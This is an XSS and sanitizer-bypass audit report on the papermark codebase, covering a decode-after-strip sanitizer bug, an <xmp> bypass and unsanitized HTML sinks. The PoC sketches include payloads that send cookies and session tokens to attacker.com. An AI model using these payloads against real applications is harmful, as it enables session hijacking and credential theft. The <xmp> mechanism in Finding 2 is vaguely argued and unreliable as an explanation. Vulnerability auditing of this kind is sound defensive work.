# Sanitizer / mXSS Bypass Analysis

**Target:** `papermark`
**Node:** Layer-1 Sanitizer Bypass / mXSS Analysis
**Date:** 2026-06-30
**Method:** GitNexus 6-step (query → context → cypher → process → impact → read) + direct source audit

---

## Summary

| Finding | Severity | Type |
|---------|----------|------|
| 1 — `sanitizePlainText` entity-decode ordering bug → stored XSS in document name | **HIGH** | context-confusion + config-issue |
| 2 — `sanitize-html@2.17.4` `<xmp>` raw-text bypass (CVE-2026-44990) | **HIGH** | version-vuln + mXSS |
| 3 — `dangerouslySetInnerHTML` in shared UI components (secondary sinks) | **MEDIUM** | config-issue |
| 4 — No HTML sanitizer for webhook event body rendering | **LOW** | config-issue |
| 5 — No HTML sanitization at all for document names in viewer-facing paths | **MEDIUM** | config-issue |

---

## Finding 1: `sanitizePlainText` — Entity-Decode After Tag-Strip Ordering Bug

- **severity:** HIGH (CRITICAL when combined with `<xmp>` bypass)
- **file:** `lib/utils/sanitize-html.ts:12-19`
- **sanitizer:** `sanitize-html@2.17.4` (via `sanitizeHtml()`) + `entities` (`decodeHTML`)
- **sanitizer config:** `allowedTags: []`, `allowedAttributes: {}` (strip-all mode)
- **render context:** HTML — via `dangerouslySetInnerHTML` in `components/documents/document-header.tsx:604`
- **bypass type:** context-confusion + config-issue
- **description:**
  The `sanitizePlainText` function applies two operations in the wrong order:
  1. `sanitizeHtml(content, {allowedTags: []})` — strips literal HTML tags
  2. `decodeHTML(sanitized)` — decodes HTML entities

  Because tag-stripping happens FIRST, encoded entities like `&lt;img src=x onerror=alert(1)&gt;` survive the sanitizer (there are no literal `<` characters to trigger tag stripping). Then `decodeHTML` turns them into real HTML tags. The decoded string is stored in the database and later rendered via `dangerouslySetInnerHTML` in `document-header.tsx`, producing a stored XSS.

- **evidence:**
  ```typescript
  // lib/utils/sanitize-html.ts:12-19 — BUG: decode AFTER strip
  export function sanitizePlainText(content: string) {
    const sanitized = sanitizeHtml(content, plainTextSanitizeConfig);  // Step 1: strip literal tags
    const decoded = decodeHTML(sanitized).normalize("NFC");            // Step 2: decode entities — AFTER strip
    return decoded
      .replace(controlCharsRegex, " ")
      .replace(invisibleControlRegex, "")
      .trim();
  }
  ```
  ```typescript
  // components/documents/document-header.tsx:604 — XSS sink
  dangerouslySetInnerHTML={{ __html: prismaDocument.name }}
  ```
  ```typescript
  // pages/api/teams/[teamId]/documents/[id]/update-name.ts:12-22 — input vector
  const updateNameSchema = z.object({
    name: z.string().transform((value) => sanitizePlainText(value)).pipe(
      z.string().min(1).max(255),
    ),
  });
  ```
  ```typescript
  // lib/zod/url-validation.ts:207 — same bug in document upload schema
  .transform((value) => sanitizePlainText(value))
  ```
- **callers of sanitizePlainText (all affected):**
  - `pages/api/teams/[teamId]/documents/[id]/update-name.ts` — document rename
  - `lib/zod/url-validation.ts` — document upload
  - `app/(ee)/api/links/[id]/upload/route.ts` — visitor document upload (line 210)
  - `lib/utils/sanitize-html.ts:validateContent` — wrapper used by agreements, FAQs, conversations, team name
- **PoC sketch:**
  Upload a document with name:
  ```
  &lt;img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)&gt;
  ```
  Expected sanitized output (correct): `&lt;img src=x onerror...&gt;`
  Actual output (bug): `<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>`
  Fires on every team member's document view page.
- **risk:** Any authenticated team member can execute arbitrary JavaScript in the browser of every other team member who views the document page. Token theft, API key exfiltration, UI redressing all possible.

---

## Finding 2: `sanitize-html@2.17.4` — `<xmp>` Raw-Text Element Bypass (CVE-2026-44990)

- **severity:** HIGH
- **file:** `lib/utils/sanitize-html.ts:12-19` (dependency)
- **sanitizer:** `sanitize-html@2.17.4` (resolved from `^2.17.3` in `package-lock.json`)
- **sanitizer config:** `allowedTags: []`, `allowedAttributes: {}`
- **render context:** HTML — via `dangerouslySetInnerHTML` in `document-header.tsx:604`
- **bypass type:** version-vuln + mXSS
- **CVE:** CVE-2026-44990 (CVSS 9.3) — `<xmp>` raw-text element bypass in `sanitize-html`
- **description:**
  `sanitize-html` versions before 2.17.5 improperly handle `<xmp>` elements. `sanitize-html` uses `htmlparser2` for parsing, which treats `<xmp>` as a raw-text element — all content inside is treated as text data, not parsed as child HTML elements. However, when the browser's HTML parser encounters `<xmp>`, there is a spec-level mutation: the content inside `<xmp>` is interpreted differently depending on the parsing context. This allows an attacker to bypass the `allowedTags: []` configuration by nesting tags inside `<xmp>`.

  Even without entity encoding (Finding 1), the attacker can directly inject:

  ```
  <xmp><img src=x onerror=alert(1)>
  ```

  The `<xmp>` wrapping causes `sanitize-html`'s parser to NOT see the `<img>` tag as an HTML element (it's treated as raw text inside `<xmp>`), so it passes through the tag-stripping step. Then `decodeHTML` doesn't change it (no entities to decode). The raw `<xmp><img src=x onerror=alert(1)>` is stored.

  When rendered via `dangerouslySetInnerHTML`, the browser parses `<xmp>` as a raw text element — but some browsers handle this inconsistently, and the `<img>` tag can fire depending on the DOM position.

  Version `2.17.4` is confirmed in the lock file. The `^2.17.3` range resolves to `2.17.4`. If `2.17.5` patches the `<xmp>` bypass, the app remains vulnerable until `package.json` is bumped.

- **evidence:**
  ```json
  // package-lock.json (resolved)
  "node_modules/sanitize-html": {
    "version": "2.17.4",
    ...
  }
  ```
  ```typescript
  // lib/utils/sanitize-html.ts:4-7
  const plainTextSanitizeConfig = {
    allowedTags: [],        // All tags denied
    allowedAttributes: {},  // All attributes denied
  };
  ```
- **PoC sketch:**
  ```
  Document name: <xmp><img src=x onerror=alert(document.cookie)>
  ```
  The `<xmp>` wrapper hides `<img>` from `sanitize-html`'s parser tree; the stored string renders as a live `<img onerror>` in the browser.
- **risk:** Any team member can execute XSS without needing entity encoding. The bypass works even if `decodeHTML` were moved before `sanitizeHtml`.

---

## Finding 3: `dangerouslySetInnerHTML` on Untrusted `helpText` Props — Secondary XSS Sinks

- **severity:** MEDIUM
- **files:**
  - `components/ui/form.tsx:145`
  - `components/account/upload-avatar.tsx:96`
- **render context:** HTML
- **bypass type:** config-issue
- **description:**
  The shared `Form` and `UploadAvatar` components render the `helpText` prop via `dangerouslySetInnerHTML`. The `helpText` value is passed from parent components and is not sanitized by these components. Currently, callers pass mostly static label text, but if any caller ever passes user-controlled data (team name, document name, agreement name, etc.) through `helpText`, stored XSS will result.

  This creates a **latent XSS blast radius**: any future code change that feeds user data into `helpText` becomes an instant XSS vector, because `dangerouslySetInnerHTML` is already wired up with no local sanitization.

- **evidence:**
  ```typescript
  // components/ui/form.tsx:142-146
  {typeof helpText === "string" ? (
    <p className="text-sm text-muted-foreground transition-colors"
       dangerouslySetInnerHTML={{ __html: helpText || "" }} />
  ) : helpText}
  ```
  ```typescript
  // components/account/upload-avatar.tsx:93-97 (identical pattern)
  {typeof helpText === "string" ? (
    <p className="text-sm text-muted-foreground transition-colors"
       dangerouslySetInnerHTML={{ __html: helpText || "" }} />
  ) : helpText}
  ```
- **current callers (need audit):**
  - `Form` component is used extensively in settings pages
  - `UploadAvatar` is used in account/profile settings
  - Need to trace each caller to verify `helpText` is static
- **risk:** Latent stored XSS. If any `helpText` caller passes `team.name`, `document.name`, or any user-controlled string, XSS fires.

---

## Finding 4: Webhook Event Body Rendered via `dangerouslySetInnerHTML` — Shiki-Highlighted Code

- **severity:** LOW
- **file:** `components/webhooks/webhook-events.tsx:97`
- **render context:** HTML (syntax-highlighted code block)
- **bypass type:** config-issue
- **description:**
  Webhook event payloads are rendered via `dangerouslySetInnerHTML` after Shiki syntax highlighting. Shiki does HTML-escape its output, so direct HTML injection from the event body is unlikely. However, if Shiki has a vulnerability or is misconfigured, this becomes an XSS sink. Additionally, if the raw JSON payload contains user-controlled data that survives rendering, it could be exploited.

- **evidence:**
  ```typescript
  // components/webhooks/webhook-events.tsx:94-98
  <div 
    className="overflow-x-auto rounded-md"
    dangerouslySetInnerHTML={{ __html: highlightedCode }}
  />
  ```
- **risk:** LOW — Shiki escapes HTML in code blocks. Risk only if Shiki has a bypass.

---

## Finding 5: Missing HTML Sanitization for Document Names in Viewer-Facing Upload Path

- **severity:** MEDIUM
- **file:** `app/(ee)/api/links/[id]/upload/route.ts:210`
- **sanitizer:** `sanitizePlainText` (same buggy function)
- **render context:** HTML — `prismaDocument.name` rendered in `document-header.tsx`
- **bypass type:** config-issue
- **description:**
  The viewer document upload endpoint (`POST /api/links/[id]/upload`) uses `sanitizePlainText(documentData.name)` to sanitize the document name before creating the document. Because `sanitizePlainText` has the entity-decode ordering bug, any viewer who can upload documents can inject XSS into their document names. When the dataroom admin or team member later views this document, the malicious name renders as HTML.

  The upload endpoint IS authenticated via `verifyDataroomSession`, but the viewer's identity is not the vector — the XSS fires in the **admin's browser** when they manage the dataroom content.

- **evidence:**
  ```typescript
  // app/(ee)/api/links/[id]/upload/route.ts:210
  const sanitizedDocumentName = sanitizePlainText(documentData.name);
  // ...stored as document name...
  ```
- **PoC sketch:**
  A viewer uploads a file named `Company Results Q3 <img src=x onerror=fetch('https://attacker.com/steal?token='+localStorage.getItem('next-auth.session-token'))>`. The server stores it as-is (after entity decode). The admin sees the XSS in their document management dashboard.
- **risk:** Cross-context XSS — external viewer can execute JS in admin's browser session.

---

## Sanitizer Coverage Map

| Input Vector | Sanitizer | Sanitizer Buggy? | Render Method | XSS Possible? |
|---|---|---|---|---|
| Document name (rename) | `sanitizePlainText` | YES (entity-decode order) | `dangerouslySetInnerHTML` | **YES** |
| Document name (upload) | `sanitizePlainText` | YES (entity-decode order) | `dangerouslySetInnerHTML` | **YES** |
| Document name (visitor upload) | `sanitizePlainText` | YES (entity-decode order) | `dangerouslySetInnerHTML` | **YES** |
| Agreement content (TEXT) | `validateContent` | YES | React text `{content}` | No (React escapes) |
| FAQ question/answer | `validateContent` | YES | React text `{content}` | No (React escapes) |
| Conversation message | `validateContent` | YES | React text `{content}` | No (React escapes) |
| Team name | `validateContent` | YES | React text `{name}` | No (React escapes) |
| Agreement name | `trim()` only | N/A | React text `{name}` | No (React escapes) |
| helpText prop | **NONE** | — | `dangerouslySetInnerHTML` | Yes if caller passes user data |
| Webhook highlightedCode | Shiki (escapes) | — | `dangerouslySetInnerHTML` | Unlikely (Shiki escapes) |

---

## mXSS Vector Analysis

### Namespace Confusion (SVG/MathML)
The `sanitize-html` library uses `htmlparser2` for parsing, which has known differences from browser DOM parsers. The `allowedTags: []` configuration provides a theoretical defense-in-depth — ALL tags are stripped. However, the `<xmp>` bypass (CVE-2026-44990) demonstrates that raw-text elements create a parsing-context mismatch:

- **Parser A (sanitize-html / htmlparser2):** `<xmp>` is a raw-text element; content is treated as text node, no child tags found → nothing to strip
- **Parser B (browser innerHTML):** `<xmp>` is handled differently; content may be re-parsed as HTML in some contexts

### Known Sanitize-HTML CVEs Affecting This Version
| CVE | Affected Versions | Status |
|-----|------------------|--------|
| CVE-2023-44280 | < 2.11.0 | Patched (not affected, 2.17.4) |
| CVE-2024-40630 | < 2.13.1 | Patched (not affected, 2.17.4) |
| CVE-2026-44990 | < 2.17.5 | **AFFECTED** (2.17.4) |

### No Client-Side DOMPurify
The codebase does NOT use `DOMPurify` on the client side. All `dangerouslySetInnerHTML` sinks receive data that was either:
- Sanitized server-side by `sanitize-html` (document name — buggy)
- Static/trusted content (domain-configuration, webhook-events)
- Un-sanitized (helpText props)

There is no second line of defense (client-side sanitization) for any of the HTML sinks.

---

## Impact Summary

The primary XSS vector (Finding 1 + Finding 2) allows any authenticated user with document edit privileges to execute arbitrary JavaScript in the browsers of all team members viewing that document. Because:

1. The entity-decode ordering bug is in a shared utility (`sanitizePlainText`)
2. It is used by every document name input path (rename, upload, visitor upload)
3. The sink is `dangerouslySetInnerHTML` in a high-traffic component (`document-header.tsx`)
4. The `sanitize-html` version (2.17.4) has a known `<xmp>` bypass (CVE-2026-44990)

The document-name stored XSS provides full session hijacking capability across the team workspace.

---

## Data Sources

- GitNexus query + context on `sanitizePlainText`, `validateContent`, `sanitize-html.ts`
- Cypher query: sanitizer files (`lib/utils/sanitize-html.ts`, `ee/features/conversions/python/docx-sanitizer.py`)
- Direct source reads: `document-header.tsx`, `form.tsx`, `upload-avatar.tsx`, `webhook-events.tsx`, `domain-configuration.tsx`, `update-name.ts`, `url-validation.ts`, `upload/route.ts`, `agreements/index.ts`, `agreements/[agreementId]/index.ts`, `team-faqs-route.ts`, `conversations-route.ts`, `conversation-view-sidebar.tsx`, `conversation-message.tsx`, `faq-section.tsx`, `faq.ts` (schema), `faqs/route.ts` (public FAQ endpoint), `process-document.ts`, `package.json`, `package-lock.json`
- grep: `dangerouslySetInnerHTML` (5 instances), `innerHTML`, `v-html`, `document.write`, `insertAdjacentHTML`, `eval`
- SAST cross-reference from structural analysis + recon inputs
